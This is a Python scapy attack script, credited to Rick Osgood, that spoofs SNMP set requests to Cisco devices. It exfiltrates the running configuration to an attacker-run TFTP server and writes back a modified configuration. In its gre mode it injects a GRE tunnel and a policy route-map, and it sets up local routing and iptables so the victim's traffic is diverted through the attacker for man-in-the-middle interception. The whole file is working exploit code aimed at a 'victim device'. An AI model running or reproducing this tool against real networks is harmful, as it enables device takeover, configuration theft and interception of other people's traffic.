#!/usr/bin/python
# This tool will send SNMP commands with a spoofed source IP address in order to...
# - Download Cisco running config
# - Upload Cisco running config
# - Create GRE tunnel on device for MITM

import argparse
from scapy.all import *
import os
import time
import sys

def main():
    parser = argparse.ArgumentParser(description='SNMP Spoofer\nBy: Rick Osgood')
    parser.add_argument("--operation", required=True, help="Desired SNMP operation (read, write)")
    parser.add_argument("--dest_ip", required=True, help="IP address of victim device")
    parser.add_argument("--src_ip", required=True, help="Spoofed source IP address")
    parser.add_argument("--tftp_ip", required=True, help="IP address of TFTP server")
    parser.add_argument("--community", required=False, default="private", help="SNMP community name")
    parser.add_argument("--filename", required=False, default="pwnd_cisco_config.txt", help="File name for the saved Cisco device config file")
    parser.add_argument("--gre_net_local_ip", required=False, help="Local IP for gre interface (172.16.0.3)")
    parser.add_argument("--gre_local_ip", required=False, help="Local IP address at this end of the GRE tunnel")
    parser.add_argument("--gre_interface", required=False, help="Interface to route GRE traffic")

    args = parser.parse_args()

    dest_ip = args.dest_ip
    src_ip = args.src_ip
    tftp_ip = args.tftp_ip
    community_name = args.community
    filename = args.filename
    operation = args.operation

    operations = ["read", "write", "gre"]

    if operation not in operations:
        print "ERROR: Invalid operations. Valid operations are: " + str(operations)
        exit()

    print "[*] Starting atftpd..."
    print "\t* atftpd --daemon --port 69 /tmp"
    os.system("atftpd --daemon --port 69 /tmp")

    if operation == "read" or operation == "gre":
        print "[*] Touching config file..."
        print "\t* touch /tmp/"
        os.system("touch /tmp/" + filename)
        print "\t* chmod 777 /tmp/"
        os.system("chmod 777 /tmp/" + filename)

        print "[*] Obtaining Cisco config via spoofed SNMP request..."
        packet = IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + tftp_ip),value=filename)]))
        send(packet)

    if operation == "gre":
        print "[*] Waiting 2 seconds..."
        time.sleep(2)

        ip_octets = args.gre_net_local_ip.split('.')

        print "[*] Creating GRE interface..."
        print "\t* modprobe ip_gre"
        os.system("modprobe ip_gre")
        print "\t* iptunnel add grenet mode gre remote " + dest_ip + " local " + args.gre_local_ip
        os.system("iptunnel add grenet mode gre remote " + dest_ip + " local " + args.gre_local_ip)
        print "\t* ip addr add " + args.gre_net_local_ip + "/24 dev grenet"
        os.system("ip addr add " + args.gre_net_local_ip + "/24 dev grenet")
        print "\t* ifconfig grenet up"
        os.system("ifconfig grenet up")

        # Open file for reading
        configfile = open("/tmp/" + filename)
        config = configfile.readlines()

        print "[*] Listing interfaces:"

        interfaces = []
        canPrintLines = False
        for line in config:
            if line.startswith("interface"):
                interfaces.append(line.split(" ")[1][:-1])
                canPrintLines = True
            elif line.startswith("!"):
                canPrintLines = False
            if canPrintLines:
                print(line[:-1])

        tunnel_source_int = raw_input("Enter tunnel source interface name as shown above: ")
        if tunnel_source_int not in interfaces:
            print "ERROR: Interface is invalid. Valid interfaces are: " + str(interfaces)
            exit()

        sniff_int = raw_input("Enter interface name to sniff as shown above: ")
        if sniff_int not in interfaces:
            print "ERROR: Interface is invalid. Valid interfaces are: " + str(interfaces)
            exit()

        print "[*] Adding routes..."
        print "\t* route add -net " + ip_octets[0] + "." + ip_octets[1] + "." + ip_octets[2] + ".0 netmask 255.255.255.0 dev grenet"
        os.system("route add -net " + ip_octets[0] + "." + ip_octets[1] + "." + ip_octets[2] + ".0 netmask 255.255.255.0 dev grenet")

        for line in range(0, len(config)):
            if sniff_int in config[line]:
                for i in range(line, len(config)):
                    if "ip address" in config[i]:
                        sniff_net = config[i][:-1].split(" ")[3].split(".")
                        sniff_netmask = config[i][:-1].split(" ")[4]
                        break

        print "\t* route add -net " + sniff_net[0] + "." + sniff_net[1] + "." + sniff_net[2] + ".0 netmask " + sniff_netmask + " gw " + ip_octets[0] + "." + ip_octets[1] + "." + ip_octets[2] + ".1"
        os.system("route add -net " + sniff_net[0] + "." + sniff_net[1] + "." + sniff_net[2] + ".0 netmask " + sniff_netmask + " gw " + ip_octets[0] + "." + ip_octets[1] + "." + ip_octets[2] + ".1")

        print "[*] Modifying Cisco config file..."

        # Delete the "end" at the end of the line
        config = config[:-1]
        config.append("interface Tunnel0\n")
        config.append(" ip address " + ip_octets[0] + "." + ip_octets[1] + "." + ip_octets[2] + ".1 255.255.255.0\n")
        config.append(" tunnel source " + tunnel_source_int + "\n")
        config.append(" tunnel destination " + args.gre_local_ip + "\n")
        config.append("!\n")
        config.append("route-map divert permit 10\n")
        config.append(" match ip address 102\n")
        config.append(" set ip next-hop " + args.gre_local_ip + "\n")
        config.append("!\n")
        config.append("end\n")

        # Insert config line to interface
        for line in range(0, len(config)):
            if config[line].startswith("interface"):
                if sniff_int in config[line]:
                    config.insert(line + 1, " ip policy route-map divert\n")

        filename = filename + "_modified"
        print "[*] Saving new config as /tmp/" + filename
        configfile2 = open("/tmp/" + filename, "w+")
        configfile2.writelines(config)
        configfile2.close()

        print "[*] Displaying new config:"
        for line in config:
            print line[:-1]

        print "[*] Enabling IP Forwarding..."
        print "\t* echo 1 >/proc/sys/net/ipv4/ip_forward"
        os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")

        print "[*] Modifying iptables..."
        print "\t* iptables --table nat --append POSTROUTING --out-interface eth0"
        os.system("iptables --table nat --append POSTROUTING --out-interface eth0")
        print "\t* iptables --append FORWARD --in-interface grenet -j ACCEPT"
        os.system("iptables --append FORWARD --in-interface grenet -j ACCEPT")

    if operation == "write" or operation == "gre":
        print "[*] Writing Cisco config via spoofed SNMP requests..."
        packet=IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.2.1"),value=1)]))
    	send(packet)
    	packet=IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.3.1"),value=1)]))
    	send(packet)
    	packet=IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.4.1"),value=4)]))
    	send(packet)
    	packet=IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.5.1"),value=ASN1_IPADDRESS(tftp_ip))]))
    	send(packet)
    	packet=IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.6.1"),value=filename)]))
    	send(packet)
    	packet=IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.1"),value=1)]))
        send(packet)
        print "[*] Sleeping 3 seconds..."
        time.sleep(3)

    #print "[*] Killing aftpd..."
    #print "\t* killall -9 atftpd"
    #os.system("killall -9 atftpd")
    print "[*] Use 'killall -9 atftpd' to kill tftp server"

    print "[*] Complete"

    if operation == "read":
        print "[*] Displaying contents of " + filename + ":"
        os.system("cat /tmp/" + filename)

    if operation == "gre":
        print "[*] use 'rmmod ip_gre' to disable gre tunnel."

if __name__ == '__main__':
    main()
